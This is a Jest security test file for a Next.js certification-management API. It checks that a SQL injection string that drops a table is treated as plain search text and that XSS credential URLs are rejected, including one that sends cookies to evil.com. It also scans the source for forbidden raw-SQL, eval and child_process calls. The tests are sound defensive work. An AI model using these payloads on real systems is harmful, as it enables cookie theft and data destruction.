/**
 * @jest-environment node
 */

import { PATCH as patchCertification } from "@/app/api/certificacoes/[id]/route";
import { POST as createCertification } from "@/app/api/certificacoes/route";
import { GET as listEmployees } from "@/app/api/colaboradores/route";
import { prisma } from "@/lib/prisma";
import { createSessionToken } from "@/lib/session";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { NextRequest } from "next/server";

process.env.SESSION_SECRET = "segredo-de-teste";

jest.mock("@/lib/permissions", () => ({ isAdmin: jest.fn(async () => false) }));

jest.mock("@/lib/prisma", () => ({
  prisma: {
    colaboradores: { findMany: jest.fn() },
    certificacoes: { create: jest.fn(), findUnique: jest.fn(), update: jest.fn() },
  },
}));

const findMany = prisma.colaboradores.findMany as unknown as jest.Mock;
const create = prisma.certificacoes.create as unknown as jest.Mock;
const findCertification = prisma.certificacoes.findUnique as unknown as jest.Mock;
const update = prisma.certificacoes.update as unknown as jest.Mock;

const certification = {
  colaborador_id: 3,
  nome: "AWS Cloud Practitioner",
  tipo: "Cloud",
  instituicao: "AWS",
  data_obtencao: "2026-01-10",
};

function postCertification(url_credencial: string) {
  return new NextRequest("http://localhost/api/certificacoes", {
    method: "POST",
    body: JSON.stringify({ ...certification, url_credencial }),
  });
}

beforeEach(() => {
  jest.spyOn(console, "error").mockImplementation(() => {});
});

afterEach(() => {
  jest.restoreAllMocks();
});

describe("Injeção de SQL", () => {
  it("o payload clássico vira só um texto de busca, não um comando SQL", async () => {
    const payload = "' OR '1'='1'; DROP TABLE colaboradores; --";
    findMany.mockResolvedValue([]);

    const response = await listEmployees(
      new NextRequest(
        `http://localhost/api/colaboradores?search=${encodeURIComponent(payload)}`,
      ),
    );

    expect(response.status).toBe(200);
    expect(findMany).toHaveBeenCalledWith(
      expect.objectContaining({
        where: {
          OR: [
            { nome: { contains: payload, mode: "insensitive" } },
            { email: { contains: payload, mode: "insensitive" } },
          ],
        },
      }),
    );
  });

  it("nenhum arquivo do projeto usa SQL cru, eval ou HTML cru", () => {
    const FORBIDDEN = [
      "$queryRawUnsafe",
      "$executeRawUnsafe",
      "eval(",
      "new Function(",
      "dangerouslySetInnerHTML",
      ".innerHTML",
      "child_process",
    ];
    const root = join(__dirname, "..", "..");

    const sourceFiles = (dir: string): string[] =>
      readdirSync(dir).flatMap((name) => {
        const path = join(dir, name);
        if (statSync(path).isDirectory()) return sourceFiles(path);
        return /\.(ts|tsx)$/.test(name) ? [path] : [];
      });

    const violations = ["app", "lib", "components", "contexts"]
      .flatMap((dir) => sourceFiles(join(root, dir)))
      .flatMap((file) => {
        const code = readFileSync(file, "utf8");
        return FORBIDDEN.filter((term) => code.includes(term)).map(
          (term) => `${file.slice(root.length + 1)} usa ${term}`,
        );
      });

    expect(violations).toEqual([]);
  });
});

describe("Injeção de código (XSS) na URL da credencial", () => {
  it.each([
    "javascript:alert(document.cookie)",
    "JaVaScRiPt:alert(1)",
    "  javascript:fetch('https://evil.com?c='+document.cookie)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
  ])("recusa %s ao cadastrar", async (payload) => {
    const response = await createCertification(postCertification(payload));

    expect(response.status).toBe(400);
    expect(create).not.toHaveBeenCalled();
  });

  it("aceita um link https normal", async () => {
    create.mockResolvedValue({ id: 7 });

    const response = await createCertification(
      postCertification("https://www.credly.com/badges/abc"),
    );

    expect(response.status).toBe(201);
  });

  it("recusa javascript: também ao editar", async () => {
    findCertification.mockResolvedValue({ colaborador_id: 3 });

    const response = await patchCertification(
      new NextRequest("http://localhost/api/certificacoes/7", {
        method: "PATCH",
        headers: { cookie: `session=${createSessionToken(3)}` },
        body: JSON.stringify({ url_credencial: "javascript:alert(1)" }),
      }),
      { params: Promise.resolve({ id: "7" }) },
    );

    expect(response.status).toBe(400);
    expect(update).not.toHaveBeenCalled();
  });
});
